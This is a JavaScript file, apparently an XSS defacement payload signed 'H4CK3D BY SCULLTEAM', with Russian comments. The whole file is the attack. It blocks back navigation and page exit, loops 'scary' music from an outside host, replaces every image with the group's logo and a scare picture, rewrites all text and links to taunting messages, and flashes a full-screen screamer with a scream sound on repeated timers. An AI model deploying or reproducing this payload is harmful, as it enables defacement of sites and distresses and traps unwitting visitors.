alert('H4CK3D BY SCULLTEAM');

// Блокировка возврата назад
window.history.pushState(null, null, window.location.href);
window.onpopstate = function () {
    window.history.pushState(null, null, window.location.href);
};
window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
});

// Воспроизведение страшной музыки
setTimeout(function () {
    var scaryMusic = document.createElement("audio");
    scaryMusic.src = "https://scullteam.github.io/XSS/scary.mp3";
    scaryMusic.loop = true;
    scaryMusic.play();
}, 1000);

// Замена изображений на два поочерёдно
var imageUrls = [
    "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg",
    "https://i.ibb.co/3mW0gHbN/SCULLTEAM.png"
];

function cycleImages() {
    var images = document.getElementsByTagName("img");
    var currentIndex = 0;

    setInterval(function () {
        for (var i = 0; i < images.length; i++) {
            images[i].src = imageUrls[currentIndex];
        }
        currentIndex = (currentIndex + 1) % imageUrls.length;
    }, 4000);
}

cycleImages();

// Замена текста
var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND";
var replacementLinkText = "THERE IS NO ESCAPE";

["p", "h1", "h2", "h3", "h4", "h5", "h6", "label"].forEach(tag => {
    var elements = document.getElementsByTagName(tag);
    for (var i = 0; i < elements.length; i++) {
        elements[i].textContent = replacementText;
    }
});

var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    links[i].textContent = replacementLinkText;
}

// Замена <a> на <p>
var aTags = Array.from(document.getElementsByTagName("a"));
aTags.forEach(function (link) {
    var newP = document.createElement("p");
    newP.textContent = link.textContent;
    for (var i = 0; i < link.attributes.length; i++) {
        var attr = link.attributes[i];
        newP.setAttribute(attr.name, attr.value);
    }
    link.parentNode.replaceChild(newP, link);
});

// Скример на весь экран
function showFullScreenImg() {
    var fullScreenImg = document.createElement("img");
    fullScreenImg.id = "fullScreenImg";
    fullScreenImg.src = "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg";

    var audio = document.createElement("audio");
    audio.src = "https://scullteam.github.io/XSS/krik.mp3";

    document.body.appendChild(fullScreenImg);
    document.body.appendChild(audio);

    fullScreenImg.style.display = "block";
    audio.play();

    setTimeout(function () {
        fullScreenImg.style.display = "none";
    }, 800);
}

// Таймеры скримера
setTimeout(showFullScreenImg, 6000);
setTimeout(showFullScreenImg, 13000);
setTimeout(showFullScreenImg, 25000);
setTimeout(showFullScreenImg, 45000);
setTimeout(showFullScreenImg, 75000);
setTimeout(showFullScreenImg, 90000);
setTimeout(showFullScreenImg, 105000);
setTimeout(showFullScreenImg, 120000);
setTimeout(showFullScreenImg, 135000);